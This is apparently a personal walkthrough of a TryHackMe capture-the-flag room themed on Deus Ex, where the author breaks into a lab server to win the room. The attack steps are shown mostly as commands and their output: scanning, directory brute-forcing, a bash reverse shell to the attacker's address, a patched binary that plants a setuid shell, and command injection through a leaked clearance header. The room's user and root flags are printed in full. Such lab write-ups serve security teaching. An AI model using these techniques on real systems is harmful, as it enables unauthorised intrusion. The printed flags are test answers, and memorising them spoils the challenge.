---
Can you help the NSF get a foothold in UNATCO's system?
---

![](https://i.imgur.com/6mPK3PT.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/fff94ce83db0ffebc81ec96f4d46d473.png)
### Compromise the UNATCO server

 Start Machine

The NSF are about to raid Liberty Island to capture the shipment of Ambrosia from UNATCO (The United Nations Anti-Terrorist Coalition). As our top hacker, we need you to gain a root foothold on the UNATCO admin network.

**Warning: Don't try to brute force auth - the services in question don't like this.**  

Answer the questions below

```
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ rustscan -a 10.10.179.68 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.179.68:80
Open 10.10.179.68:5901
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 18:06 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:06
Completed Parallel DNS resolution of 1 host. at 18:06, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:06
Scanning 10.10.179.68 [2 ports]
Discovered open port 80/tcp on 10.10.179.68
Discovered open port 5901/tcp on 10.10.179.68
Completed Connect Scan at 18:06, 0.19s elapsed (2 total ports)
Initiating Service scan at 18:06
Scanning 2 services on 10.10.179.68
Completed Service scan at 18:06, 6.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.179.68.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 5.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 1.61s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
Nmap scan report for 10.10.179.68
Host is up, received user-set (0.19s latency).
Scanned at 2023-01-13 18:06:45 EST for 14s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/datacubes *
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: United Nations Anti-Terrorist Coalition
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
5901/tcp open  vnc     syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:06
Completed NSE at 18:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.88 seconds

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ gobuster dir -u http://10.10.179.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.179.68
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,php,py
[+] Timeout:                 10s
===============================================================
2023/01/13 18:08:15 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 909]
/terrorism.html       (Status: 200) [Size: 5939]
/robots.txt           (Status: 200) [Size: 95]
/threats.html         (Status: 200) [Size: 4140]
Progress: 72285 / 1102805 (6.55%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/13 18:12:25 Finished
===============================================================


http://10.10.179.68/terrorism.html#freedom


Stopping Terror - A New Perspective on Freedom

When one maniac can wipe out a city of twenty million with a microbe developed in his basement, a new approach to law enforcement becomes necessary. Every citizen of the world must be placed under surveillance. That means sky-cams at every intersection, computer-mediated analysis of every phone call, e-mail, and snail-mail, and a purely electronic economy in which every transaction is recorded and data-mined for suspicious activity.

We are close to achieving this goal. Some would say that human liberty has been compromised, but the reality is just the opposite. As surveillance expands, people become free from danger, free to walk alone at night, free to work in a safe place, and free to buy any legal product or service without the threat of fraud. One day every man and woman will quietly earn credits, purchase items for quiet homes on quiet streets, have cook-outs with neighbors and strangers alike, and sleep with doors and windows wide open. If that isn't the tranquil dream of every free civilization throughout history, what is?

- Anna Navarre, Agent, UNATCO

http://10.10.179.68/threats.html


Know Your Enemy - The Triads

UNATCO surveillance of Hong Kong is currently a high priority given the renewed threat of Chinese organized crime in the form of the Triads. Despite being a model of prosperity and technological leadership for decades, Hong Kong persists as a haven for organized crime. The Triads, namely the Luminous Path and Red Arrow, vie for control of the ten-trillion credit shipping business, much of which supplies greater Asia with pirated technology, illegal drugs, and weapons.

Most disturbing of all, the Triads preach an ethic of technopiracy that has found enthusiastic support among small shopkeepers and businessmen who often aid the gangsters and buy their bootlegged software. Gullible and greedy, this army of middlemen remain insensitive to how their violations of intellectual property and copyright laws damage the global information economy.

view-source:http://10.10.179.68/badactors.html

<h1>War in Cyberspace</h1>
        <div>Current Cyber Watchlist</div>
    </header>
    
    <div>
        <h2>Vigilance Online</h2>
        <p>As part of its duties, UNATCO monitors the digital domain as well as the physical, keeping track of those malevolent actors who would use their technical aptitude to threaten security and harm the peace-loving peoples of the world.</p>
        <p>This page keeps a list of usernames that have been flagged by our sophisticated monitoring systems. If you see anyone in this list during your own travels online, be warned! You may be dealing with a cyberterrorist.
    </div>

    <div>
        <iframe src="badactors.txt"></iframe>
    </div>

    <footer>
        List is maintained by system admin, AJacobson//UNATCO.00013.76490
    </footer>
    <!-- if you can see this I might add you to the list. per United Nations directive #17, F12 is now a international cyber crime -->

view-source:http://10.10.179.68/badactors.txt

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ cat badactors         
apriest
aquinas_nz
cookiecat
craks
curley
darkmattermatt
etodd
gfoyle
grank
gsyme
haz
hgrimaldi
hhall
hquinnzell
infosneknz
jallred
jhearst
jlebedev
jooleeah
juannsf
killer_andrew
lachland
leesh
levelbeam
mattypattatty
memn0ps
nhas
notsus
oenzian
roseycross
sjasperson
sweetcharity
tfrase
thom_seven
ttong

view-source:http://10.10.179.68/robots.txt

# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *

http://10.10.179.68/datacubes/0000/

Liberty Island Datapads Archive

All credentials within *should* be [redacted] - alert the administrators immediately if any are found that are 'clear text'

Access granted to personnel with clearance of Domination/5F or higher only.

http://10.10.179.68/datacubes/0011/

attention nightshift:
van camera system login (same as old login): [redacted]
new password: [redacted]

PS) we *will* beat you at darts on saturday, suckas.

let's use burp intruder

Intercept/Payload number From 0 to 9 Step 1

GET /datacubes/000§§/ HTTP/1.1

searching by length like 526 and the others 454(0000)

now from 10 to 99 step 1

GET /datacubes/00§§/ HTTP/1.1

search by status 200 or length (0011, 0068)

http://10.10.179.68/datacubes/0011/

attention nightshift:
van camera system login (same as old login): [redacted]
new password: [redacted]

PS) we *will* beat you at darts on saturday, suckas.

http://10.10.179.68/datacubes/0068/

So many people use that ATM each day that it's busted 90% of the time. But if it's working, you might need some cash today for the pub crawl we've got planned in the city. Don't let the tourists get you down. See you there tonight, sweetie.

Accnt#: [redacted]
PIN#: [redacted]

Johnathan - your husband to be.

PS) I was serious last night-I really want to get married in the Statue. We met there on duty and all our friends work there.

now from 100 to 999 step 1

GET /datacubes/0§§/ HTTP/

search by status 200 (0103, 0233, 0451)

http://10.10.179.68/datacubes/0103/

Change ghermann password to [redacted]. Next week I guess it'll be [redacted]. Strange guy...

http://10.10.179.68/datacubes/0233/

From: Data Administration
To: Maintenance

Please change the entry codes on the east hatch to [redacted].

NOTE: This datacube should be erased immediately upon completion.

http://10.10.179.68/datacubes/0451/

Brother,

I've set up VNC on this machine under jacobson's account. We don't know his loyalty, but should assume hostile.
Problem is he's good - no doubt he'll find it... a hasty defense, but since we won't be here long, it should work.

The VNC login is the following message, 'smashthestate', hmac'ed with my username from the 'bad actors' list (lol).
Use md5 for the hmac hashing algo. The first 8 characters of the final hash is the VNC password. - JL

from 1000 to 9999 (let's see) I'm using burp pro

GET /datacubes/§§/ HTTP/1.1

nothing...

Keyed-Hash Message Authentication Codes (**HMAC**) are a mechanism for message authentication using cryptographic hash functions.

string: smashthestate

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ cat badactors | grep jl
jlebedev

key: jlebedev (UTF8)

hash:md5

311781a1830c1332a903920a59eb6d7a

311781a1 (pass)

or maybe using seq to generate a wordlist

The command you provided is used to create a wordlist containing a sequence of numbers.

-   `seq` is a command used to generate a sequence of numbers.
-   `-w` option is used to pad the numbers with leading zeroes. So, `-w 0000` means that the numbers will be 4 digits long and padded with leading zeroes as necessary.
-   `9999` is the last number in the sequence.
-   `>` is used to redirect the output of the command to a file. In this case, the output of the `seq` command is being saved to a file called "wordlist".

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ seq -w 0000 9999 > wordlist

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ gobuster dir -u http://10.10.37.31/datacubes/ -w wordlist -t 64 -k -x txt,php,py,html 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.31/datacubes/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/13 21:34:12 Starting gobuster in directory enumeration mode
===============================================================
/0011                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0011/]
/0000                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0000/]
/0068                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0068/]
/0103                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0103/]
/0233                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0233/]
/0451                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0451/]

:)

or maybe crunch

`crunch` is a command line tool that can be used to generate a wordlist of custom character sets and lengths. You can generate the same wordlist using crunch using the following command:


`crunch 4 4 0123456789 -o wordlist2`

-   `4` is the minimum length of the generated words.
-   `4` is the maximum length of the generated words.
-   `0123456789` is the character set used for generating words.
-   `-o` is used to specify the output file.

This command will generate a wordlist containing all 4-digit numbers consisting of the digits 0-9 and save the output to a file called "wordlist". As before, this wordlist could be used for cracking passwords, the same logic applies here.

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ crunch 4 4 0123456789 -o wordlist2
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ gobuster dir -u http://10.10.37.31/datacubes/ -w wordlist2 -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.31/datacubes/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                wordlist2
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              py,html,txt,php
[+] Timeout:                 10s
===============================================================
2023/01/13 21:36:53 Starting gobuster in directory enumeration mode
===============================================================
/0000                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0000/]
/0011                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0011/]
/0068                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0068/]
/0103                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0103/]
/0233                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0233/]
/0451                 (Status: 301) [Size: 319] [--> http://10.10.37.31/datacubes/0451/]
Progress: 2836 / 50005 (5.67%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/13 21:37:03 Finished
===============================================================


---

using remmina to connect (VNC : 10.10.179.68:5901) and enter pass

open user.txt

From: JManderley//UNATCO.00013.76490
To: AJacobson//UNATCO.00013.76490
Subject: re: Security Breach

Thank you for keeping me informed of the recent hacker activity and your speedy
response to same.  I'm glad our security efforts were up to snuff.

(AJacobson//UNATCO.00013.76490) wrote:

>I managed to stop the guys (actually, it was some French chick
>the CIA's been watching, perhaps a Silhouette spy(?)) trying to
>break into the net, but I took the liberty of changing some
>passwords, just in case.  Here are the new ones:
>
> thm{6ae787a98fff512ae33335e1264f0dd3}
>
>You should probably delete this as soon as you're done reading, okay?

Microsoft(R) Windows 95
   (C)Copyright Microsoft Corp 1981-1996.

C:\> ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
C:\> cd home
C:\home> ls
ajacobson
C:\home> cd ajacobson/
C:\home\ajacobson> ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  Videos
C:\home\ajacobson> cd Desktop/
C:\home\ajacobson\Desktop> ls
badactors-list  user.txt
C:\home\ajacobson\Desktop> ls -lah
total 6.7M
drwxr-xr-x  2 ajacobson ajacobson 4.0K Oct 22 05:36 .
drwxr-xr-x 20 ajacobson ajacobson 4.0K Jan 14 00:15 ..
-rwxr-xr-x  1 ajacobson ajacobson 6.7M Oct 22 05:36 badactors-list
-rw-r--r--  1 ajacobson ajacobson  643 Oct 22 14:08 user.txt
C:\home\ajacobson\Desktop> file badactors-list 
badactors-list: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9bf588974cd2b3b7c2db34d49d3df7aec3a76dc, for GNU/Linux 3.2.0, not stripped



revshell

C:\home\ajacobson\Desktop> bash -i >& /dev/tcp/10.8.19.103/1337 0>&1

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ rlwrap nc -lvnp 1337                                     
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.37.31.
Ncat: Connection from 10.10.37.31:52068.


Microsoft(R) Windows 95
   (C)Copyright Microsoft Corp 1981-1996.

C:\home\ajacobson\Desktop> python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'


Microsoft(R) Windows 95
   (C)Copyright Microsoft Corp 1981-1996.

C:\home\ajacobson\Desktop> 
zsh: suspended  rlwrap nc -lvnp 1337
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ stty raw -echo; fg
[1]  + continued  rlwrap nc -lvnp 1337
C:\home\ajacobson\Desktop> export TERM=xterm-256color
export TERM=xterm-256color

C:\home\ajacobson\Desktop> python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [14/Jan/2023 00:25:17] "GET /badactors-list HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ wget http://10.10.37.31:8000/badactors-list
--2023-01-13 19:25:16--  http://10.10.37.31:8000/badactors-list
Connecting to 10.10.37.31:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6941856 (6.6M) [application/octet-stream]
Saving to: ‘badactors-list’

badactors-list                     100%[==============================================================>]   6.62M  1.22MB/s    in 9.0s    

2023-01-13 19:25:26 (752 KB/s) - ‘badactors-list’ saved [6941856/6941856]

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ chmod +x badactors-list 
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ ls
badactors  badactors-list
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ ./badactors-list                  
Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
2023/01/13 19:26:09 Post "http://UNATCO:23023": dial tcp: no such host


adding to /etc/host

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ sudo nano /etc/hosts      
[sudo] password for kali: 
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ tail /etc/hosts
10.10.11.180 mattermost.shoppy.htb
10.10.20.190 windcorp.thm
10.10.148.212 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO

there's an app (list of badactors)

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ strings badactors-list | less

The `less` command is a command line utility used to view the contents of a text file one page at a time. To search within a file being viewed with `less`, use the forward slash (/) followed by the search term and press enter. To search for the next occurrence of the term, press n. To search for the previous occurrence, press Shift+n. To exit the search and return to normal navigation, press q.

Example:

Copy code

`less file.txt /search_term`

so searching 

/badactor

incoming valuescat /var/www/html/badactors.txtcheckmark found unmarked

/base64

may contain pointersecho %s | base64 -d > /var/www/html/badactors.txt

so let's replace this

base64 -d > /var/www/html/badactors.txt

but first check length

┌──(kali㉿kali)-[~]
└─$ python3                    
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("base64 -d > /var/www/html/badactors.txt")
39

to


cp /bin/bash /tmp/w  && chmod +s /tmp/w

┌──(kali㉿kali)-[~]
└─$ python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("cp /bin/bash /tmp/w  && chmod +s /tmp/w")
39

now replace it (ctrl + w to search in nano.. search base64 then replace)


┌──(kali㉿kali)-[~/nappy/DX1]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.37.31 - - [13/Jan/2023 19:49:57] "GET /badactors-list HTTP/1.1" 200 -

C:\home\ajacobson\Desktop> cd /tmp
cd /tmp
C:\tmp> wget http://10.8.19.103:8000/badactors-list
wget http://10.8.19.103:8000/badactors-list
--2023-01-14 00:49:58--  http://10.8.19.103:8000/badactors-list
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6941535 (6.6M) [application/octet-stream]
Saving to: ‘badactors-list’

badactors-list      100%[===================>]   6.62M  1.06MB/s    in 8.4s    

2023-01-14 00:50:06 (810 KB/s) - ‘badactors-list’ saved [6941535/6941535]

C:\tmp> chmod 777 badactors-list
chmod 777 badactors-list
C:\tmp> ls
ls
badactors-list
pulse-PKdhtXMmr18n
snap.lxd
ssh-qoTedSNcOwt2
systemd-private-48215323ef2a41eeab7bfd3cb0740100-apache2.service-KlE7Yg
systemd-private-48215323ef2a41eeab7bfd3cb0740100-colord.service-bsowPh
systemd-private-48215323ef2a41eeab7bfd3cb0740100-ModemManager.service-UxUWkh
systemd-private-48215323ef2a41eeab7bfd3cb0740100-switcheroo-control.service-wDAsSh
systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-logind.service-DSmuyi
systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-resolved.service-ae84rj
systemd-private-48215323ef2a41eeab7bfd3cb0740100-systemd-timesyncd.service-KX6o8e
systemd-private-48215323ef2a41eeab7bfd3cb0740100-upower.service-QRShUg

C:\tmp> ./badactors-list
./badactors-list
Segmentation fault (core dumped)

uhmm not work

let's do another method

http://unatco:23023/

UNATCO Liberty Island - Command/Control

RESTRICTED: ANGEL/OA

send a directive to process

using wireshark then curl

start eth0  

┌──(kali㉿kali)-[~/nappy/DX1]
└─$ ./badactors-list
Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal

write a badactor like witty then update

search http and follow tcp

POST / HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Content-Length: 49
Clearance-Code: 7gFfT74scCgzMqW4EQbu
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txtHTTP/1.1 202 Accepted
Access-Control-Allow-Origin: *
Content-Type: text/plain
Date: Sat, 14 Jan 2023 01:19:48 GMT
Content-Length: 305

apriest
aquinas_nz
cookiecat

Clearance-Code: 7gFfT74scCgzMqW4EQbu

"Clearance-Code" is not a standard HTTP header and its purpose is likely specific to the application or service that the command is communicating with. It may be used as a means of authentication or authorization, where the code included in the header is checked against a database or other source of truth to confirm the client making the request is authorized to do so.

In this context, "directive" is likely a specific key or parameter used to indicate the specific action or command that the client (the user running the cURL command) wants the server to perform. The value "whoami" is passed as the value of the "directive" parameter in the command you provided.

It could be a parameter that tells the server what to do, so it could be different depending on the value passed on it. The value "whoami" is a command that is commonly used to find out the current logged in user name. This parameter is used to instruct the server to process that specific command, this way the developer can have one endpoint to handle multiple commands.

or

Microsoft(R) Windows 95
   (C)Copyright Microsoft Corp 1981-1996.

C:\> export http_proxy=localhost:4444
C:\> cd /home
C:\home> ls
ajacobson
C:\home> cd ajacobson/
C:\home\ajacobson> cd Desktop/
C:\home\ajacobson\Desktop> ls
badactors-list  user.txt
C:\home\ajacobson\Desktop> ./badactors-list 
Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal

Microsoft(R) Windows 95
   (C)Copyright Microsoft Corp 1981-1996.

C:\> nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 47596
POST http://UNATCO:23023/ HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Content-Length: 49
Clearance-Code: 7gFfT74scCgzMqW4EQbu
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt


┌──(kali㉿kali)-[~/nappy]
└─$ curl -XPOST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' -d 'directive=whoami' UNATCO:23023
root

┌──(kali㉿kali)-[~/nappy]
└─$ curl -XPOST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' -d 'directive=cat+/root/root.txt' UNATCO:23023

From: AJacobson//UNATCO.00013.76490
To: JCDenton//UNATCO.82098.9868
Subject: Come by my office

We need to talk about that last mission.  In person, not infolink.  Come by my
office after you've been debriefed by Manderley.

    thm{985bb3c88bfe66f9b465b00198692866}

-alex-

```

![[Pasted image 20230113185314.png]]

![[Pasted image 20230113190605.png]]
![[Pasted image 20230113190927.png]]

![[Pasted image 20230113191112.png]]

![[Pasted image 20230113191815.png]]

![[Pasted image 20230113192827.png]]

![[Pasted image 20230113193423.png]]
![[Pasted image 20230113202113.png]]

What is the User flag?  

If you get locked out, restart either the target or your attack box for a new IP.

*thm{6ae787a98fff512ae33335e1264f0dd3}*

What is the Root flag?

*thm{985bb3c88bfe66f9b465b00198692866}*

###  Credits

The theme used for XFCE is [https://github.com/grassmunk/Chicago95](https://github.com/grassmunk/Chicago95) which is excellent! Thanks to my beta testers (Voy, memN0ps and sootierr). Thanks to [https://nuwen.net/dx.html](https://nuwen.net/dx.html) a compiled Deus Ex text resource by the excellent Stephan T. Lavavej. And thanks to all of you!  

Answer the questions below

Thanks!


[[Brute]]